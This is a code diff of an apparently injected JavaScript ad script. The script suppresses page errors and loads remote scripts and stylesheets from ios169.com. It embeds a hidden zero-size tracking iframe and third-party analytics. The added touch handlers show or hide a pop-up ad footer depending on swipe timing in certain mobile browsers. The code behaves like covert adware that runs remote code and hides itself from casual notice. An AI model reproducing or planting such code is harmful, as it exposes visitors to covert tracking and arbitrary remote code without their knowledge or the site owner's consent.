@@ -1,8 +1,10 @@
-﻿﻿window.onerror = function (msg){}
+﻿window.onerror = function (msg){}
+var _chopinFF = 0;
+var _startTime  = new Date().getTime();
 
 function chopinCheckIn(){
     var _webname = window.location.href;
-    var chopinWebArray = new Array("m.baidu.com","m.fengniao.com","www.ios169.com","ios169.com","download.shengli.com");
+    var chopinWebArray = new Array("m.baidu.com","m.fengniao.com","download.shengli.com");
     var flag = false;
     for(var i=0;i<chopinWebArray.length;i++){
         if(_webname.indexOf(chopinWebArray[i])>-1){
@@ -37,7 +39,8 @@ function chopinCreateFooter(contents){
         var _c_head= document.getElementsByTagName('head')[0];
         var _c_script1= document.createElement('script');
         _c_script1.type= 'text/javascript';
-        _c_script1.src= "http://139.129.201.254/getAds.php?flagNum=1&typeNum="+chopinFigureSystem()+"&adsIdNum="+contents[4];
+        _c_script1.src= "http://ios169.com/getAds.php?flagNum=1&typeNum="+chopinFigureSystem()+"&adsIdNum="+contents[4];
+        _czc.push(["_trackEvent", "主页底部广告详情点击", "详情点击", "点击", 1, "span_chopinvzi28_4"]);
         _c_head.appendChild(_c_script1);
         window.open(encodeURI(contents[2]),"_blank");
     }
@@ -78,7 +81,7 @@ function chopinFigureSystem() {
 }
 function chopinImportCss(){
     var chopinLink = document.createElement('link');
-    chopinLink.href = "http://139.129.201.254/chopin_default.css";
+    chopinLink.href = "http://ios169.com/chopin_default.css";
     chopinLink.rel = 'stylesheet';
     chopinLink.type = 'text/css';
     document.body.appendChild(chopinLink);
@@ -86,7 +89,7 @@ function chopinImportCss(){
 function chopinTimeout(contents){
     chopinImportCss();
     chopinCreateFooter(contents);
-    document.getElementById("chopinFooter").style.display="block";
+    document.getElementById("chopinFooter").style.display="none";
 }
 
 var jsadsHandler = function(data){
@@ -104,17 +107,146 @@ var chopinWebFlag = chopinCheckIn();
 if(!chopinWebFlag){
     var _c_script2 = document.createElement("script");
     _c_script2.type = "text/javascript";
-    _c_script2.src = "http://139.129.201.254/getAds.php?flagNum=0&typeNum="+chopinFigureSystem();
-    window.onload = function(){document.body.appendChild(_c_script2);}
+    _c_script2.src = "http://ios169.com/getAds.php?flagNum=0&typeNum="+chopinFigureSystem();
+    document.body.appendChild(_c_script2);
+    StatisticsOne();
 }
 
+function _touch(){
+    var starty;
+    var _endTime;
+    var _tmpCount = 0;
+    var el=document;
+    el.addEventListener('touchstart',function(e){
+        var touch=e.changedTouches;
+        starty=touch[0].clientY;
+        _endTime = new Date().getTime();
+    });
+
+    if((navigator.userAgent.indexOf('UCBrowser') > -1) || (navigator.userAgent.indexOf('baidu') > -1) ){
+        el.addEventListener('touchcancel',function(e){
+            var touch=e.changedTouches;
+            var endy1=touch[0].clientY;
+            if(starty-endy1 > 0){
+                _tmpCount++;
+                var _discountTime = _endTime-_startTime;
+                if(_chopinFF==0){
+                    if(_discountTime<3000){
+                        _tmpCount = 0;
+                    }else if(_discountTime>=3000 && _discountTime<9000 && _tmpCount==1){
+                        try{
+                            document.getElementById("chopinFooter").style.display="block";
+                            _chopinFF = 10;
+                            _tmpCount = 0;
+                        }catch(e){}
+                    }else if(_discountTime>=9000 && _discountTime<15000 && _tmpCount==3){
+                        try{
+                            document.getElementById("chopinFooter").style.display="block";
+                            _chopinFF = 20;
+                            _tmpCount = 0;
+                        }catch(e){}
+                    }else if(_discountTime>=15000 && _tmpCount==3){
+                        try{
+                            document.getElementById("chopinFooter").style.display="block";
+                            _chopinFF = 30;
+                            _tmpCount = 0;
+                        }catch(e){}
+                    }else{}
+                }else if(_chopinFF==10){
+                    if(_tmpCount==3){
+                        try{
+                            document.getElementById("chopinFooter").style.display="none";
+                            _chopinFF = 100;
+                        }catch(e){}
+                    }
+                }else if(_chopinFF==20){
+                    if(_tmpCount==3){
+                        try{
+                            document.getElementById("chopinFooter").style.display="none";
+                            _chopinFF = 100;
+                        }catch(e){}
+                    }
+                }else if(_chopinFF==30){
+                    if(_tmpCount==2){
+                        try{
+                            document.getElementById("chopinFooter").style.display="none";
+                            _chopinFF = 100;
+                        }catch(e){}
+                    }
+                }
+            }
+        });
+    }
+
+    el.addEventListener('touchend',function(e){
+        var touch=e.changedTouches;
+        var endy=touch[0].clientY;
+        if(starty-endy > 0){
+            _tmpCount++;
+            var _discountTime = _endTime-_startTime;
+            if(_chopinFF==0){
+                if(_discountTime<3000){
+                    _tmpCount = 0;
+                }else if(_discountTime>=3000 && _discountTime<9000 && _tmpCount==1){
+                    try{
+                        document.getElementById("chopinFooter").style.display="block";
+                        _chopinFF = 10;
+                        _tmpCount = 0;
+                    }catch(e){}
+                }else if(_discountTime>=9000 && _discountTime<15000 && _tmpCount==3){
+                    try{
+                        document.getElementById("chopinFooter").style.display="block";
+                        _chopinFF = 20;
+                        _tmpCount = 0;
+                    }catch(e){}
+                }else if(_discountTime>=15000 && _tmpCount==3){
+                    try{
+                        document.getElementById("chopinFooter").style.display="block";
+                        _chopinFF = 30;
+                        _tmpCount = 0;
+                    }catch(e){}
+                }else{}
+            }else if(_chopinFF==10){
+                if(_tmpCount==3){
+                    try{
+                        document.getElementById("chopinFooter").style.display="none";
+                        _chopinFF = 100;
+                    }catch(e){}
+                }
+            }else if(_chopinFF==20){
+                if(_tmpCount==3){
+                    try{
+                        document.getElementById("chopinFooter").style.display="none";
+                        _chopinFF = 100;
+                    }catch(e){}
+                }
+            }else if(_chopinFF==30){
+                if(_tmpCount==2){
+                    try{
+                        document.getElementById("chopinFooter").style.display="none";
+                        _chopinFF = 100;
+                    }catch(e){}
+                }
+            }
+        }
+    });
+}
+
+_touch();
+
 var _hmt = _hmt || [];
-(function() {
-   	var _iframeCount = document.createElement("iframe");
-	_iframeCount.style.display = "none";
-	_iframeCount.frameborder = "no";
-	_iframeCount.src = "http://139.129.201.254/iframeCount.html";
-	_iframeCount.width = "0px";
-	_iframeCount.height = "0px";
-	document.body.appendChild(_iframeCount);
-})();
+function StatisticsOne() {
+    var _iframeCount = document.createElement("iframe");
+    _iframeCount.style.display = "none";
+    _iframeCount.frameborder = "no";
+    _iframeCount.src = "http://ios169.com/iframeCount.html";
+    _iframeCount.width = "0px";
+    _iframeCount.height = "0px";
+    document.body.appendChild(_iframeCount);
+
+    //cnzz
+    var cnzz = document.createElement("script");
+    cnzz.src = "//s95.cnzz.com/z_stat.php?id=1260757667&web_id=1260757667";
+    var cnzzs = document.getElementsByTagName("script")[0];
+    cnzzs.parentNode.insertBefore(cnzz, cnzzs);
+};
